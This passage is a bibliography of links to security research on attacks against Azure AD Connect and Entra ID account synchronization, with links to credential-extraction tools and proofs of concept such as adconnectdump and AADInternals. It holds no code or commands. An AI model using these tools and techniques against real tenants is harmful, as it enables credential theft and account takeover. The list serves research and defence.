- [Sygnia: New Attack Vectors in Azure AD Connect](https://www.sygnia.co/blog/guarding-the-bridge-new-attack-vectors-in-azure-ad-connect/)
- [Silverfort: Entra ID Account Synchronization Exploitation](https://www.silverfort.com/blog/exploiting-weaknesses-in-entra-id-account-synchronization-to-compromise-the-on-prem-environment/)
- [Semperis: SyncJacking - Hard Matching Takeover](https://www.semperis.com/blog/syncjacking-azure-ad-account-takeover/)
- [Datadog: I SPy - Escalating via SAML in Federated Domains](https://securitylabs.datadoghq.com/articles/i-spy-escalating-to-entra-id-global-admin/)
- [Tenable: Persistent Implicit Permissions in Synchronization](https://www.tenable.com/blog/despite-recent-security-hardening-entra-id-synchronization-feature-remains-open-for-abuse)
- [ogwilliam.com: Hidden Permissions Risk in Entra Synchronization](https://blog.ogwilliam.com/post/hybrid-identity-security-the-hidden-permissions-risk-in-entra-id-synchronization/)

**Tools & PoCs:**
- [dirkjanm/adconnectdump - Credential Extraction](https://github.com/dirkjanm/adconnectdump)
- [xpn/azuread_decrypt_msol - Alternative extraction](https://gist.github.com/xpn/0dc393e944d8733e3c63023c20e0b4ae)
- [AADInternals - Implicit API Exploitation](https://github.com/Gerenios/AADInternals)
- [Atomic Red Team T1098 Tests](https://github.com/redcanaryco/atomic-red-team)

**Cloud-Architekt Research:**
- [AAD Attack Defense: ADConnect Service Account](https://github.com/Cloud-Architekt/AzureAD-Attack-Defense/blob/main/AADCSyncServiceAccount.md)

---